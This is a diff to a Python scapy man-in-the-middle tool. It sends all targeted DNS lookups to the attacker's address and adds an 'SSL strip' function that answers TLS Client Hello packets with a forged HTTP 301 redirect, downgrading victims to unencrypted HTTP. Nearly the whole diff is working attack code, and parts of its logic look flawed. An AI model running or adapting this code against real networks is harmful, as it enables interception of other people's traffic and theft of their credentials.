@@ -2,7 +2,7 @@ import sys
 import json
 import threading
 import time
-from scapy.all import IP, Ether, send, sniff, getmacbyip, conf, get_if_hwaddr, ARP, sendp, TCP, UDP, ICMP, DNS, DNSQR, DNSRR, get_if_addr
+from scapy.all import Raw, IP, Ether, send, sniff, getmacbyip, conf, get_if_hwaddr, ARP, sendp, TCP, UDP, ICMP, DNS, DNSQR, DNSRR, get_if_addr
 import copy
 from http.server import BaseHTTPRequestHandler, HTTPServer
 import socket
@@ -74,15 +74,57 @@ def handle_incoming_packet(packet):
             domain = packet[DNSQR].qname
             with dns_targets_lock:
                 is_domain_in_targets = domain.decode().rstrip('.').lower() in dns_targets
-                redirect_ip = dns_targets.get(domain.decode().rstrip('.').lower())
+                redirect_ip = attacker_ip #dns_targets.get(domain.decode().rstrip('.').lower())
             if is_domain_in_targets:
                 dns_spoof(packet, redirect_ip)
             else:
                 redirect_packet(dst_mac, packet)
+                # Detect HTTPS (port 443) and strip to HTTP
+        if packet.haslayer(TCP) and packet[TCP].dport == 443:
+            # Assume it's the first TLS handshake (Client Hello)
+            domain = None
+            if packet.haslayer(Raw):
+                raw_payload = bytes(packet[TCP].payload)
+                if raw_payload.startswith(b"\x16\x03"):  # TLS Handshake
+                    with dns_targets_lock:
+                        for target_domain, redirect_ip in dns_targets.items():
+                            if get_mac(packet[IP].dst):  # check we spoofed this domain
+                                domain = target_domain
+                                break
+
+            if domain:
+                redirect_http(packet, domain)
+                return  # Stop further processing
+
         else:
             redirect_packet(dst_mac, packet)
 
         print_packet_in_json(packet)
+
+
+def redirect_http(packet, domain):
+    try:
+        http_response = (
+            f"HTTP/1.1 301 Moved Permanently\r\n"
+            f"Location: http://{domain}/\r\n"
+            f"Content-Length: 0\r\n"
+            f"Connection: close\r\n\r\n"
+        )
+
+        ether = Ether(src=attacker_mac, dst=packet[Ether].src)
+        ip = IP(src=packet[IP].dst, dst=packet[IP].src)
+        tcp = TCP(
+            sport=443,
+            dport=packet[TCP].sport,
+            seq=packet[TCP].ack,
+            ack=packet[TCP].seq + len(packet[TCP].payload),
+            flags="FA"
+        )
+
+        sendp(ether/ip/tcp/http_response, iface=conf.iface, verbose=False)
+        log_info(f"[SSL Strip] Sent HTTP redirect to {packet[IP].src} for {domain}")
+    except Exception as e:
+        log_error(f"Failed to send SSL strip redirect: {str(e)}")
 
 
 def dns_spoof(packet, redirect_ip):
